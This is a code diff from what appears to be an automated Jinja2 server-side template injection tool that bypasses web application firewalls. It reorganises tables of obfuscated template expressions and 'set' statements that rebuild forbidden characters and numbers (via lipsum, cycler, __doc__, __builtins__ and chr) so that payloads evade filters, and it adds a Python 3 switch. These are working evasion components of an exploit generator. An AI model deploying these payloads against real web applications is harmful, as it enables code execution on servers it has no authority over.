@@ -7,8 +7,8 @@ import logging
 import random
 import string
 import re
-from .const import WafFunc, SET_STMT_PATTERNS
-
+from .const import WafFunc, PythonEnvironment, SET_STMT_PATTERNS
+from .options import Options
 logger = logging.getLogger("context_vars")
 
 # 所有的上下文payload, 存储格式为: {payload: {变量名：变量值}}
@@ -44,6 +44,10 @@ context_payloads_stmts: ContextPayloads = {
         "ssbb": 556,
         "zzeb": 223,
     },
+
+}
+
+context_payloads_stmts_py3 = {
     (
         "{%set ndr={}|select()|trim|list|batch(25)|first|last%}{%set sls=1|attr"
         + "((ndr,ndr,dict(truediv=x)|join,ndr,ndr)|join)|attr"
@@ -55,6 +59,31 @@ context_payloads_stmts: ContextPayloads = {
 }
 
 context_payloads_exprs = {
+    "lipsum()|urlencode|first": "%",
+    "lipsum|escape|batch(22)|first|last": "_",
+
+    "dict(x=x)|length": 1,
+    "dict(x=x)|count": 1,
+    "dict(a=x,b=x,c=x)|length": 3,
+    "dict(a=x,b=x,c=x)|count": 3,
+    "dict(aaaaa=x)|first|length": 5,
+    "dict(aaaaa=x)|first|count": 5,
+
+    "lipsum.__doc__|length": 43,
+    "namespace.__doc__|length": 126,
+
+    "joiner|urlencode|wordcount": 7,
+    "namespace|escape|count": 46,
+    "cycler|escape|urlencode|count": 65,
+    "namespace|escape|urlencode|escape|urlencode|count": 90,
+    (
+        "cycler|escape|urlencode|escape|urlenc"
+        + "ode|escape|urlencode|escape|urlencode|count"
+    ): 131,
+    "lipsum|escape|urlencode|list|escape|urlencode|count": 2015,
+}
+
+context_payloads_exprs_py3 = {
     "1.__mod__.__doc__.__getitem__(11)": "%",
     (
         "({0:1}|safe).replace((1|safe).rjust(2),"
@@ -66,33 +95,13 @@ context_payloads_exprs = {
         + "|trim|list)[24]))*2+dict(builtins=x)|join+((({}|select()|trim|list"
         + ")[24]))*2][dict(chr=x)|join](37))"
     ): "%",
-    "lipsum()|urlencode|first": "%",
     "({}|select()|trim|list)[24]": "_",
-    "lipsum|escape|batch(22)|first|last": "_",
     "{}|select()|trim|list|batch(25)|first|last": "_",
     "{}|select()|trim|list|attr(dict(po=x,p=x)|join)(24)": "_",
-    "dict(x=x)|length": 1,
-    "dict(x=x)|count": 1,
-    "dict(a=x,b=x,c=x)|length": 3,
-    "dict(a=x,b=x,c=x)|count": 3,
-    "dict(aaaaa=x)|first|length": 5,
-    "dict(aaaaa=x)|first|count": 5,
-
-    "lipsum.__doc__|length": 43,
-    "namespace.__doc__|length": 126,
     "{}|escape|first|count": 1,
     "{}|escape|urlencode|count": 6,
     "{}|escape|list|escape|count": 26,
-    "joiner|urlencode|wordcount": 7,
-    "namespace|escape|count": 46,
-    "cycler|escape|urlencode|count": 65,
-    "namespace|escape|urlencode|escape|urlencode|count": 90,
-    (
-        "cycler|escape|urlencode|escape|urlenc"
-        + "ode|escape|urlencode|escape|urlencode|count"
-    ): 131,
     "{}|escape|urlencode|list|escape|urlencode|count": 178,
-    "lipsum|escape|urlencode|list|escape|urlencode|count": 2015,
 }
 
 digit_looks_similiar = {
@@ -294,8 +303,10 @@ class ContextVariableManager:
         }
 
 
-def get_context_vars_manager(waf: WafFunc) -> ContextVariableManager:
+def get_context_vars_manager(waf: WafFunc, options: Options) -> ContextVariableManager:
     context_payloads = context_payloads_stmts.copy()
+    if options.python_version == PythonEnvironment.PYTHON3:
+        context_payloads.update(context_payloads_stmts_py3)
     manager = ContextVariableManager(waf, context_payloads)
     manager.do_prepare()
 
@@ -308,7 +319,10 @@ def get_context_vars_manager(waf: WafFunc) -> ContextVariableManager:
     if not set_stmt_pattern:
         return manager
 
-    for expr, value in context_payloads_exprs.items():
+    exprs = context_payloads_exprs.copy()
+    if options.python_version == PythonEnvironment.PYTHON3:
+        exprs.update(context_payloads_exprs_py3)
+    for expr, value in exprs.items():
         if not waf(expr):
             continue
         name = manager.generate_random_variable_name()
